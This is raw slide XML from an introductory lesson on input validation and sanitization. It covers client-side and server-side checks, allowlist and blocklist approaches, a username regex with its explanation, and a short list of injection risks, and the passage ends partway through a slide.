          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Which of the following is a common security testing technique?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A) Usability testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>B) Penetration testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C) Load testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>D) Performance testing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4946366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4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D4AEA93-B45D-C658-A60F-6ED845F9FE86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="709613" y="1443038"/>
            <a:ext cx="8434387" cy="132343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000" b="1" i="0" u="none" strike="noStrike" kern="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sym typeface="Arial"/>
              </a:rPr>
              <a:t>Introduction to input validation &amp; sensitive data</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-IN" sz="4000" b="1" i="0" u="none" strike="noStrike" kern="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13907081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CCD9F-3B8D-6066-7E3C-E25992388CD8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>What is input validation?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{610C372C-A467-D020-EB74-55788836D8B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215749"/>
            <a:ext cx="7704000" cy="3646763"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Input validation is the process of ensuring that the data provided by users or other external sources is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>correct, complete, and secure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>before processing it in an application. It is a critical first line of defense in application security. It helps prevent the exploitation of vulnerabilities that could lead to data breaches, unauthorized access, and other security issues. It helps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>To prevent invalid, malicious, or unexpected data from being processed by the application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Protects against various security vulnerabilities, such as injection attacks (e.g., SQL injection), buffer overflows, and cross-site scripting (XSS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Accepts only known, safe data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rejects known dangerous inputs. Less secure, as it may not account for all malicious input variations.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17344076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EB836-F5F5-6124-B933-BD819F95938A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Types of Input Validation:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7EFA7D5-9CBF-00A4-7B8E-56717A7D0405}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Client-Side Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Performed on the user's browser before the data is sent to the server. Enhances user experience but is not sufficient on its own.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Improves User Experience, Reduces Server Load, and provides Faster Response Time</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It poses </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Security Risks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and has </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Limited Validation Capabilities</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Server-Side Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Performed on the server after receiving data. This is essential for security, as client-side validation can be bypassed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Increases Security, provides Comprehensive Validation, and have Consistent Validation check</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It causes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Slower Response Time </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Increased Server Load.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12881063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8D407-2531-52A9-812D-EC1390FC07F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Secure </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN"/>
              <a:t>Input Handling</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CED08369-F824-5199-FFB5-35CC70AD83DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1017725"/>
            <a:ext cx="7704000" cy="3586225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Determine all the points in your application where user input is received, such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>forms, query parameters, API endpoints, and file uploads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Whitelist Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Define what is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>acceptable, and reject everything else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Blacklist Validation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Identify known malicious input patterns and reject them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1700" b="1" dirty="0"/>
              <a:t>Pattern Matching: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>It's the process of checking if a string of data (like an email, phone number, or username) follows a specific pattern or structure. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Implement Validation on Both Client and Server Sides</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use Built-in Libraries and Frameworks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>Sanitize Input: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Cleanse input to remove or neutralize harmful elements, such as escaping special characters in SQL queries or stripping HTML tags to prevent XSS attacks.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33646555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8D407-2531-52A9-812D-EC1390FC07F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="430737"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Continued….</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CED08369-F824-5199-FFB5-35CC70AD83DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215749"/>
            <a:ext cx="7704000" cy="3727725"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Validate Based on Context:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>String Length and Format</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: Ensure text fields conform to expected lengths and formats (e.g., email addresses, phone numbers).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>Numeric Ranges</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: Ensure numbers fall within allowed ranges (e.g., age between 18 and 100).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>Data Type Checks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: Confirm the input data type matches the expected type (e.g., integers, dates).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="1200150" lvl="1" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>File Uploads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: Validate file types and sizes to prevent malicious file uploads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Regularly test input validation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Inform users when their input is invalid. Avoid exposing sensitive information in error messages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Regularly update validation rules.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27662261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6B355-5CD9-F8BF-9DEB-DA2E15D58098}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Regex Pattern</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D676D7CA-ED57-6B18-C255-9C709316FC68}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>^[a-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>zA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>-Z][a-zA-Z0-9_]{2,19}$</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    Explanation:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>^[a-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>zA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>-Z] - Must start with a letter.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[a-zA-Z0-9_]{2,19} - Followed by 2 to 19 more characters which can be letters, numbers, or underscores.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>$ - End of string. The total length is 1 + (2 to 19) = 3 to 20.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42342470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138F4-558E-81BF-DB49-9A599A8E50EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Input Sanitization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE5F15AF-A9D8-E64A-EAB9-1E8E6A31A824}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Input sanitization is the process of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>cleaning, filtering, and validating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> any data that comes from an outside source before you use it in your application.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The fundamental rule in cybersecurity is: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>"Never trust user input."</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Input sanitization is how you put that rule into practice.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The Risks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>SQL Injection </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Command Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5678814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42764-10D0-12FF-905C-D6200F9E78E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How Does Input Sanitization Work?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F169DC28-6E2A-F245-EC94-F6E529348445}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="1215749"/>
            <a:ext cx="7799652" cy="3774121"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
